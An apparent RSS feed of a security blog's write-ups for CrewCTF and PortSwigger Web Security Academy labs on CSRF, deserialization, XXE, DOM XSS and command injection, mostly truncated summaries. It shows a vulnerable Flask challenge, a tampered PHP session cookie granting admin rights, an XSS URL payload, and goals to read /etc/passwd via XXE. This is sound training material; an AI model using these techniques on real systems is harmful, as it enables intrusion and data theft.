<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/web/</link><description>Recent content in Web on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/web/index.xml" rel="self" type="application/rss+xml"/><item><title>CrewCTF - sequence_gallery</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</guid><description>&lt;h1 id="crewctf---sequence_gallery">
 CrewCTF - sequence_gallery
 &lt;a class="anchor" href="#crewctf---sequence_gallery">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command Injection&lt;/a>
&lt;a href="https://www.geeksforgeeks.org/dc-command-in-linux-with-examples/">dc command in Linux with examples&lt;/a>
&lt;a href="https://deepinout.com/linux-cmd/linux-numerical-computation-cmd/linux-cmd-dc.html">Linux dc命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>dc -h
Usage: dc [OPTION] [file &amp;hellip;]
-e, &amp;ndash;expression=EXPR evaluate expression
-f, &amp;ndash;file=FILE evaluate contents of file
-h, &amp;ndash;help display this help and exit
-V, &amp;ndash;version output version information and exit&lt;/p>
&lt;p>Email bug reports to: &lt;a href="mailto:bug-dc@gnu.org">bug-dc@gnu.org&lt;/a> .&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">import os
import sqlite3
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get(&amp;#39;/&amp;#39;)
def index():
	sequence = request.args.get(&amp;#39;sequence&amp;#39;, None)
	if sequence is None:
		return render_template(&amp;#39;index.html&amp;#39;)

	script_file = os.path.basename(sequence + &amp;#39;.dc&amp;#39;)
	if &amp;#39; &amp;#39; in script_file or &amp;#39;flag&amp;#39; in script_file:
		return &amp;#39;:(&amp;#39;

	proc = subprocess.run(
		[&amp;#39;dc&amp;#39;, script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template(&amp;#39;index.html&amp;#39;, output=output)

if __name__ == &amp;#39;__main__&amp;#39;:
	app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8080)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</guid><description>&lt;h1 id="csrf---apprentice">
 CSRF - APPRENTICE
 &lt;a class="anchor" href="#csrf---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="lab-csrf-vulnerability-with-no-defenses">
 Lab: CSRF vulnerability with no defenses
 &lt;a class="anchor" href="#lab-csrf-vulnerability-with-no-defenses">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF.&lt;/li>
&lt;li>Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer&amp;rsquo;s email address and upload it to your exploit server.
You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
&lt;li>Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
&lt;a href="https://medium.com/@Tommmmm/csrf-%e6%94%bb%e6%93%8a%e5%8e%9f%e7%90%86-d0f2a51810ca">CSRF 攻擊原理&lt;/a>
&lt;a href="https://ithelp.ithome.com.tw/articles/10251769">[Day25]- 新手的Web系列CSRF&lt;/a>&lt;/p></description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</guid><description>&lt;h1 id="deserialization---apprentice">
 Deserialization - APPRENTICE
 &lt;a class="anchor" href="#deserialization---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="lab-modifying-serialized-objects">
 Lab: Modifying serialized objects
 &lt;a class="anchor" href="#lab-modifying-serialized-objects">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result.&lt;/li>
&lt;li>Goal: To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&amp;rsquo;s account.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;/ul>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Login First &amp;amp; Recon the package
According to the description, we know that the user verification has insecure deserialization. Therefore, we can recon the package first as below.
&lt;img src="https://i.imgur.com/zuKHXRF.png" alt="" />
You can notice the session is a base64-encoded string and we use the built-in feature in burp suite to decode it.
Session: &lt;code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d&lt;/code>
Decoded String: &lt;code>O:4:&amp;quot;User&amp;quot;:2:{s:8:&amp;quot;username&amp;quot;;s:6:&amp;quot;wiener&amp;quot;;s:5:&amp;quot;admin&amp;quot;;b:0;}&lt;/code>&lt;/li>
&lt;li>How about Modify the session directly
&lt;img src="https://i.imgur.com/Ent5yuu.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h3 id="exp---change-directly">
 Exp - Change Directly
 &lt;a class="anchor" href="#exp---change-directly">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>We can use the built-in feature to change our session to &lt;code>admin=1&lt;/code> directly to then send it forward.
:::info
Each package may contain the session that should be modified. So, pay attention to before sending it forward
:::&lt;/li>
&lt;li>Delete Carlos
&lt;img src="https://i.imgur.com/9KGxgZD.png" alt="" />&lt;/li>
&lt;/ol>
&lt;p>:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/eQEfiaw.png" alt="" />
:::&lt;/p></description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</guid><description>&lt;h1 id="lab-arbitrary-object-injection-in-php">
 Lab: Arbitrary object injection in PHP
 &lt;a class="anchor" href="#lab-arbitrary-object-injection-in-php">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result.&lt;/li>
&lt;li>Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&amp;rsquo;s home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;li>Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.&lt;/li>
&lt;/ul>
&lt;h2 id="constructor--deconstructor">
 Constructor &amp;amp; Deconstructor
 &lt;a class="anchor" href="#constructor--deconstructor">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://tw511.com/a/01/26451.html">Python建構函式與解構函式（&lt;strong>init&lt;/strong>()和__del__()）&lt;/a>
其實概念就是Python的&lt;code>__init()__&lt;/code> function，在instanciate一個class的時候扮演初始化的功能而已
而deconstructor就是Python中的&lt;code>__del__()&lt;/code> function用來回收不需要的class，以達到降低記憶體的使用量&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction">
 Lab: Blind XXE with out-of-band interaction
 &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.
You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.&lt;/li>
&lt;li>Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.&lt;/li>
&lt;li>Hint:&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 &lt;a href="https://portswigger.net/web-security/xxe/blind">Background&lt;/a>
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">
 Lab: Blind XXE with out-of-band interaction via XML parameter entities
 &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.&lt;/li>
&lt;li>Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.&lt;/li>
&lt;li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator&amp;rsquo;s default public server.&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在&lt;code>DOCTYPE&lt;/code>中直接Reference，也就是利用&lt;code>%&lt;/code>這個字元達到這個效果&lt;/p></description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</guid><description>&lt;h1 id="lab-csrf-where-token-is-not-tied-to-user-session">
 Lab: CSRF where token is not tied to user session
 &lt;a class="anchor" href="#lab-csrf-where-token-is-not-tied-to-user-session">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&amp;rsquo;t integrated into the site&amp;rsquo;s session handling system.&lt;/li>
&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
&lt;code>wiener:peter&lt;/code>
&lt;code>carlos:montoya&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>CSRF token should tied to user session otherwise, it&amp;rsquo;ll exploited by attacker.&lt;/p></description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</guid><description>&lt;h1 id="lab-csrf-where-token-is-tied-to-non-session-cookie">
 Lab: CSRF where token is tied to non-session cookie
 &lt;a class="anchor" href="#lab-csrf-where-token-is-tied-to-non-session-cookie">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>
&lt;p>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&amp;rsquo;t fully integrated into the site&amp;rsquo;s session handling system.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
&lt;code>wiener:peter&lt;/code>
&lt;code>carlos:montoya&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-request-method">
 Lab: CSRF where token validation depends on request method
 &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-request-method">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.&lt;/li>
&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Login and update email to trace the package
Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below:
&lt;img src="https://i.imgur.com/ju0fDUQ.png" alt="" />
We can notice that the carried data including &lt;code>csrf_token&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-token-being-present">
 Lab: CSRF where token validation depends on token being present
 &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-token-being-present">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF.&lt;/li>
&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Login and update email to trace the package
It&amp;rsquo;s very similar with previous lab $\to$ it contained &lt;code>CSRF_token&lt;/code> as its carried data:
&lt;img src="https://i.imgur.com/69FaW1R.png" alt="" />&lt;/p></description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</guid><description>&lt;h1 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">
 Lab: DOM XSS in &lt;code>document.write&lt;/code> sink using source &lt;code>location.search&lt;/code> inside a select element
 &lt;a class="anchor" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript &lt;code>document.write&lt;/code> function, which writes data out to the page. The &lt;code>document.write&lt;/code> function is called with data from &lt;code>location.search&lt;/code> which you can control using the website URL. The data is enclosed within a select element.&lt;/li>
&lt;li>Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the &lt;code>alert&lt;/code> function.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Find the injection place
I used string search to find &lt;code>location.search&lt;/code> in each sub-page source.
Here is the interesting code:
:::spoiler Source Code
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 var stores = [&amp;#34;London&amp;#34;,&amp;#34;Paris&amp;#34;,&amp;#34;Milan&amp;#34;];
 var store = (new URLSearchParams(window.location.search)).get(&amp;#39;storeId&amp;#39;);
 document.write(&amp;#39;&amp;lt;select name=&amp;#34;storeId&amp;#34;&amp;gt;&amp;#39;);
 if(store) {
 document.write(&amp;#39;&amp;lt;option selected&amp;gt;&amp;#39;+store+&amp;#39;&amp;lt;/option&amp;gt;&amp;#39;);
 }
 for(var i=0;i&amp;lt;stores.length;i++) {
 if(stores[i] === store) {
 continue;
 }
 document.write(&amp;#39;&amp;lt;option&amp;gt;&amp;#39;+stores[i]+&amp;#39;&amp;lt;/option&amp;gt;&amp;#39;);
 }
 document.write(&amp;#39;&amp;lt;/select&amp;gt;&amp;#39;);
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Try type something about &lt;code>storeID&lt;/code> as URL GET parameter
Payload: &lt;code>/product?productId=1&amp;amp;storeId=abc&lt;/code>
&lt;img src="https://i.imgur.com/KKbTF8f.png" alt="" />
You can see that this is a perfect injection place&lt;/li>
&lt;/ol>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>/product?productId=1&amp;amp;storeId=&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/bjEoUzh.png" alt="" />
:::&lt;/p></description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</guid><description>&lt;h1 id="lab-exploiting-xinclude-to-retrieve-files">
 Lab: Exploiting &lt;code>XInclude&lt;/code> to retrieve files
 &lt;a class="anchor" href="#lab-exploiting-xinclude-to-retrieve-files">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don&amp;rsquo;t control the entire XML document you can&amp;rsquo;t define a DTD to launch a classic XXE attack.&lt;/li>
&lt;li>Goal: To solve the lab, inject an &lt;code>XInclude&lt;/code> statement to retrieve the contents of the /etc/passwd file.&lt;/li>
&lt;li>Hint: By default, &lt;code>XInclude&lt;/code> will try to parse the included document as XML. Since /etc/passwd isn&amp;rsquo;t valid XML, you will need to add an extra attribute to the &lt;code>XInclude&lt;/code> directive to change this behavior.&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">
 Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
 &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.&lt;/li>
&lt;li>Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file.&lt;/li>
&lt;li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator&amp;rsquo;s default public server.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use the previous method
:::spoiler Payload&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">
 Lab: Exploiting blind XXE to retrieve data via error messages
 &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.&lt;/li>
&lt;li>Goal: To solve the lab, use an external DTD to trigger an error message that displays the contents of the &lt;code>/etc/passwd&lt;/code> file.
The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)&lt;/p></description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</guid><description>&lt;h1 id="lab-exploiting-java-deserialization-with-apache-commons">
 Lab: Exploiting Java deserialization with Apache Commons
 &lt;a class="anchor" href="#lab-exploiting-java-deserialization-with-apache-commons">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&amp;rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.&lt;/li>
&lt;li>Goal: To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&amp;rsquo;s home directory.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
